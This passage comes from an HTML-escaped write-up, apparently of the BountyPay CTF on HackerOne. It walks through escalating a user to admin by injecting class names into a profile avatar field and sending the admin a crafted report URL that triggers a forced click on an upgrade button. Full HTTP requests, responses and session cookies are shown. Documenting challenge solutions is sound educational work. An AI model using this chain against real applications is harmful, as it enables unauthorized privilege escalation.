class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eUser Upgraded to Admin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eremoveClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eactive\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eactive\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv.content\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv.content-\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eattr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003edata-target\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)).\u003c/span\u003e\u003cspan class=\"nx\"\u003eremoveClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.sendReport\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/admin/report?url=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eReport sent to admin team\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#myModal\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003emodal\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehide\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}),\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab1\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab1\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab2\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab2\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab3\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab3\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab4\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab4\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI figured that I\u0026#39;d have to make all of the following to happen all at once: \u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eSend a report to an admin.\u003c/li\u003e\n\u003cli\u003eMake the admin to trigger a click on upgradeToAdmin button.\u003c/li\u003e\n\u003cli\u003eMake sure Sandra\u0026#39;s username would be injected to an input form. \u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eWithin the report, I figured that I had to send a URL containg a \u003ccode\u003e#tab2\u003c/code\u003e in the url (or any other tabs for that matter) as this will trigger a click.\u003c/p\u003e\n\n\u003cp\u003eThen, in order to make an automated click, I replaced my avatar with \u003ccode\u003eupgradeToAdmin tab tab2\u003c/code\u003e by editing my profile: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ePOST /?template\u003cspan class=\"o\"\u003e=\u003c/span\u003ehome HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nConnection: close\nContent-Length: 67\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eMacintosh\u003cspan class=\"p\"\u003e;\u003c/span\u003e Intel Mac OS X 10_15_5\u003cspan class=\"o\"\u003e)\u003c/span\u003e AppleWebKit/537.36 \u003cspan class=\"o\"\u003e(\u003c/span\u003eKHTML, like Gecko\u003cspan class=\"o\"\u003e)\u003c/span\u003e Chrome/83.0.4103.61 Safari/537.36\nReferer: https://staff.bountypay.h1ctf.com/?template\u003cspan class=\"o\"\u003e=\u003c/span\u003ehome\nCookie: \u003cspan class=\"nv\"\u003etoken\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ec0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\n\n\u003cspan class=\"nv\"\u003eprofile_name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003esandra1\u0026amp;profile_avatar\u003cspan class=\"o\"\u003e=\u003c/span\u003eavatar1 tab upgradeToAdmin tab2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eEnding up with a new cookie in the response:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003eHTTP/1.1 302 Found\nServer: nginx/1.14.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nDate: Sun, 07 Jun 2020 22:18:02 GMT\nContent-Type: text/html\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eUTF-8\nConnection: close\nSet-Cookie: \u003cspan class=\"nv\"\u003etoken\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ec0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCWnZ5cnprMkdlQlJSS0dJdjdqWnlyTmRZNUYrVDA2VG9aNGduY3NFU2NFbzB0QXdLOXZmMVVPRS84SFhqL2Q0bDA0M2xZdXgvNVhnc0hkZWtkdmlZWjhIcjNVMmVNYmYzRURHQnNvUU55ckRtOTZyWllJcWgzL3J6Uk9BK21iWnVEYkt1U0JrZFNoODMzMVB4MmFiYWg5YXBwSG1NeWNNUmYrUUJiU084U2JwST0%3D\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003eexpires\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eTue, 07-Jul-2020 22:18:02 GMT\u003cspan class=\"p\"\u003e;\u003c/span\u003e Max-Age\u003cspan class=\"o\"\u003e=\u003c/span\u003e2592000\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/\nLocation: /?template\u003cspan class=\"o\"\u003e=\u003c/span\u003ehome\nContent-Length: 0\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow I had to figure how to inject the username. This took some time, but at the end I thought about the way Hackerone uses its parameters and tried the same by passing a template array instead of template string, i.e: \u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://staff.bountypay.h1ctf.com/?template%5B%5D=login\u0026amp;template%5B%5D=ticket\u0026amp;username=sandra.allison\u0026amp;ticket_id=3582#tab2\" href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2F%3Ftemplate%255B%255D%3Dlogin%26template%255B%255D%3Dticket%26username%3Dsandra.allison%26ticket_id%3D3582%23tab2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://staff.bountypay.h1ctf.com/?template%5B%5D=login\u0026amp;template%5B%5D=ticket\u0026amp;username=sandra.allison\u0026amp;ticket_id=3582#tab2\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eUsing this URL I had 2 templates loaded: \u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"twotemplates.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tTTnPzRZZZq3rzeZejP6Vctv?response-content-disposition=attachment%3B%20filename%3D%22twotemplates.png%22%3B%20filename%2A%3DUTF-8%27%27twotemplates.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=262774fde79abc02c6bd51930d08a15a821136e769de4bec13d34a94c2a8dde0\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tTTnPzRZZZq3rzeZejP6Vctv?response-content-disposition=attachment%3B%20filename%3D%22twotemplates.png%22%3B%20filename%2A%3DUTF-8%27%27twotemplates.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=262774fde79abc02c6bd51930d08a15a821136e769de4bec13d34a94c2a8dde0\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eNow all I had to do was sending the encoded URL to the admin: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003eGET /admin/report?url\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003eLz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRpY2tldF9pZD0zNTgyI3RhYjI\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nConnection: close\nAccept: \u003cspan class=\"k\"\u003e*\u003c/span\u003e/\u003cspan class=\"k\"\u003e*\u003c/span\u003e\nUser-Agent: Mozilla/5.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eMacintosh\u003cspan class=\"p\"\u003e;\u003c/span\u003e Intel Mac OS X 10_15_5\u003cspan class=\"o\"\u003e)\u003c/span\u003e AppleWebKit/537.36 \u003cspan class=\"o\"\u003e(\u003c/span\u003eKHTML, like Gecko\u003cspan class=\"o\"\u003e)\u003c/span\u003e Chrome/83.0.4103.61 Safari/537.36\nX-Requested-With: XMLHttpRequest\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://staff.bountypay.h1ctf.com/?template\u003cspan class=\"o\"\u003e=\u003c/span\u003eticket\u0026amp;ticket_id\u003cspan class=\"o\"\u003e=\u003c/span\u003e3582\nAccept-Encoding: \u003cspan class=\"nb\"\u003egzip\u003c/span\u003e, deflate\nAccept-Language: en-US,en\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nv\"\u003eq\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.9,he\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nv\"\u003eq\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.8\nCookie: \u003cspan class=\"nv\"\u003etoken\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ec0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCWnZ5cnprMkdlQlJSS0dJdjdqWnlyTmRZNUYrVDA2VG9aNGduY3NFU2NFbzB0QXdLOXZmMVVPRS84SFhqL2Q0bDA0M2xZdXgvNVhnc0hkZWtkdmlZWjhIcjNVMmVNYmYzRURHQnNvUU55ckRtOTZyWllJcWgzL3J6Uk9BK21iWnVEYkt1U0JrZFNoODMzMVB4MmFiYWg5YXBwSG1NeWNNUmYrUUJiU084U2JwST0%3D\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand a new cookie was generated \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nServer: nginx/1.14.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nDate: Sun, 07 Jun 2020 22:18:47 GMT\nContent-Type: application/json\nConnection: close\nSet-Cookie: \u003cspan class=\"nv\"\u003etoken\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ec0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCWnZ5cnprMkdlQlJSS0dJdjdqWnlyTmRZNUYrVDA2VG9aNGduY3NFU2NFbzB0QXdLOXZmMVVPRS84SFhqL2Q0bDA0M2xZdXgvNVhnc0hkZWtkdmlZWjhIcjNVMmVNYmYzNktXd3VtR2tVcURtOTZyWllJcWgzL3J6Uk9BK21iWjdaYkt1UkJrTloxc21qaGFkd05lR2s5cTF2U1dFMWRwbFYrMWRlU09BUmJwST0%3D\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003eexpires\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eTue, 07-Jul-2020 22:18:47 GMT\u003cspan class=\"p\"\u003e;\u003c/span\u003e Max-Age\u003cspan class=\"o\"\u003e=\u003c/span\u003e2592000\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/\nContent-Length: 19\n\n\u003cspan 